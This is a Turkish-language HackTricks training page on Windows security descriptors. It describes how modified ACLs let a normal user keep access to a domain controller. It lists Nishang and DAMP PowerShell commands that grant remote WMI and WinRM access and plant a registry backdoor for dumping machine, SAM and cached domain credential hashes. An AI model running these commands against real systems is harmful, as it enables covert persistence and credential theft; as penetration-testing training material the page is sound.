# Güvenlik Tanımlayıcıları

{{#include ../../banners/hacktricks-training.md}}

## Güvenlik Tanımlayıcıları

[Belgelerden](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Güvenlik Tanımlayıcı Tanım Dili (SDDL), bir güvenlik tanımlayıcısını tanımlamak için kullanılan formatı tanımlar. SDDL, DACL ve SACL için ACE dizelerini kullanır: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

**Güvenlik tanımlayıcıları**, bir **nesnenin** başka bir **nesne** üzerindeki **izinlerini** **saklamak** için kullanılır. Eğer bir nesnenin **güvenlik tanımlayıcısında** sadece **küçük bir değişiklik** yapabilirseniz, o nesne üzerinde, ayrıcalıklı bir grubun üyesi olmanıza gerek kalmadan, çok ilginç ayrıcalıklar elde edebilirsiniz.

Bu nedenle, bu kalıcılık tekniği, belirli nesneler üzerinde gereken her ayrıcalığı kazanma yeteneğine dayanır; böylece genellikle yönetici ayrıcalıkları gerektiren bir görevi, yönetici olmadan gerçekleştirebilirsiniz.

### WMI'ye Erişim

Bir kullanıcıya **uzaktan WMI çalıştırma** erişimi verebilirsiniz [**bunu kullanarak**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### WinRM'e Erişim

Bir kullanıcıya **winrm PS konsoluna erişim verin** [**bunu kullanarak**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Hash'lara uzaktan erişim

**Kayıt defterine** erişin ve **hash'leri dökün**, böylece **DAMP** kullanarak bir **Reg arka kapısı oluşturun**, böylece istediğiniz zaman **bilgisayarın hash'ini**, **SAM**'i ve bilgisayardaki herhangi bir **önbelleklenmiş AD** kimlik bilgilerini alabilirsiniz. Bu nedenle, bu izni bir **normal kullanıcıya bir Alan Denetleyici bilgisayarı üzerinde** vermek çok faydalıdır:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
[**Silver Tickets**](silver-ticket.md) bölümünü kontrol edin, böylece bir Domain Controller'ın bilgisayar hesabının hash'ini nasıl kullanabileceğinizi öğrenebilirsiniz.

{{#include ../../banners/hacktricks-training.md}}
